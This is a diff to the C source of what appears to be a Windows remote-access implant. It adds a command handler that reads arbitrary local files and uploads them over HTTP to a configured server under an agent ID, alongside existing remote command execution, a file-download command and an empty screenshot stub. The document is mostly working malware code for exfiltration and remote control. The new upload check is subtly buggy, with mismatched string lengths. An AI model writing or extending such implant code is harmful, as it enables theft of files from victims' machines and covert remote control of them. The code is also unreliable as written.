@@ -1,10 +1,10 @@
 #include <windows.h>
 #include <string.h>
 #include <stdio.h>
-#include "../include/network.h"
 #include <wincred.h>
 #include <wininet.h>
-#pragma comment(lib, "Advapi32.lib")
+#include "../include/commands.h"
+#include "../include/network.h"
 
 void download_file(const char *remote_path, const char *agent_id, char *output, size_t output_size) {
     // Open the file
@@ -155,11 +155,148 @@ void download_file(const char *remote_path, const char *agent_id, char *output, 
     free(file_data);
 }
 
+void upload_file(const char *local_path, const char *agent_id, char *output, size_t output_size) {
+    // Open the file
+    FILE *file = fopen(local_path, "rb");
+    if (!file) {
+        snprintf(output, output_size, "[!] File not found: %s", local_path);
+        return;
+    }
+
+    // Get file size
+    fseek(file, 0, SEEK_END);
+    long file_size = ftell(file);
+    fseek(file, 0, SEEK_SET);
+
+    // Allocate memory and read file
+    char *file_data = malloc(file_size);
+    if (!file_data) {
+        fclose(file);
+        snprintf(output, output_size, "[!] Memory allocation failed");
+        return;
+    }
+    fread(file_data, 1, file_size, file);
+    fclose(file);
+
+    // Extract filename
+    const char *filename = local_path;
+    const char *last_slash = strrchr(local_path, '\\');
+    const char *last_fslash = strrchr(local_path, '/');
+    if (last_slash && (!last_fslash || last_slash > last_fslash))
+        filename = last_slash + 1;
+    else if (last_fslash)
+        filename = last_fslash + 1;
+
+    // Initialize WinINet
+    HINTERNET hInternet = InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) {
+        DWORD error = GetLastError();
+        free(file_data);
+        snprintf(output, output_size, "[!] InternetOpen failed: %lu", error);
+        return;
+    }
+
+    // Set timeouts
+    DWORD timeout = 30000;
+    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
+    InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
+    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
+
+    // Connect to the server
+    HINTERNET hConnect = InternetConnectA(hInternet, SERVER_IP, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConnect) {
+        DWORD error = GetLastError();
+        InternetCloseHandle(hInternet);
+        free(file_data);
+        snprintf(output, output_size, "[!] InternetConnect failed: %lu", error);
+        return;
+    }
+
+    // Build the request path: e.g., /upload/agent123/filename.txt
+    char path[256];
+    snprintf(path, sizeof(path), "/upload/%s/%s", agent_id, filename);
+
+    // Create HTTP request
+    HINTERNET hRequest = HttpOpenRequestA(
+        hConnect,
+        "POST",
+        path,
+        HTTP_VERSION,
+        NULL,
+        NULL,
+        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_AUTO_REDIRECT,
+        0
+    );
+
+    if (!hRequest) {
+        DWORD error = GetLastError();
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        free(file_data);
+        snprintf(output, output_size, "[!] HttpOpenRequest failed: %lu", error);
+        return;
+    }
+
+    // Add headers
+    char headers[256];
+    snprintf(headers, sizeof(headers),
+             "Content-Type: application/octet-stream\r\n"
+             "Content-Length: %ld\r\n"
+             "Connection: Keep-Alive\r\n",
+             file_size);
+
+    HttpAddRequestHeadersA(hRequest, headers, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
+
+    // Upload file
+    BOOL success = FALSE;
+    int retries = 3;
+    DWORD error = 0;
+
+    while (retries-- > 0 && !success) {
+        success = HttpSendRequestA(hRequest, NULL, 0, file_data, file_size);
+        if (!success) {
+            error = GetLastError();
+            if (error != ERROR_INTERNET_CONNECTION_ABORTED &&
+                error != ERROR_INTERNET_CONNECTION_RESET &&
+                error != ERROR_INTERNET_TIMEOUT) {
+                break;
+            }
+            Sleep(1000);
+        }
+    }
+
+    if (success) {
+        DWORD status_code = 0;
+        DWORD size = sizeof(status_code);
+        DWORD index = 0;
+
+        if (HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &status_code, &size, &index) && status_code == 200) {
+            snprintf(output, output_size, "[+] Uploaded: %s", filename);
+        } else {
+            snprintf(output, output_size, "[!] Server responded with HTTP %lu", status_code);
+        }
+    } else {
+        snprintf(output, output_size, "[!] Upload failed: %lu", error);
+    }
+
+    // Cleanup
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+    free(file_data);
+}
+
 void execute_command(const char *command, char *output, size_t output_size, const char *agent_id) {
 
     if (strncmp(command, "download ", 9) == 0) {
         const char *remote_path = command + 9;
         download_file(remote_path, agent_id, output, output_size);
+        return;
+    }
+
+    if (strncmp(command, "upload ", 9) == 0) {
+        const char *remote_path = command + 9;
+        upload_file(remote_path, agent_id, output, output_size);
         return;
     }
 
@@ -195,6 +332,10 @@ void execute_command(const char *command, char *output, size_t output_size, cons
         CloseHandle(pi.hThread);
     }
     CloseHandle(hRead);
+}
+
+void take_screenshot() {
+
 }
 
 
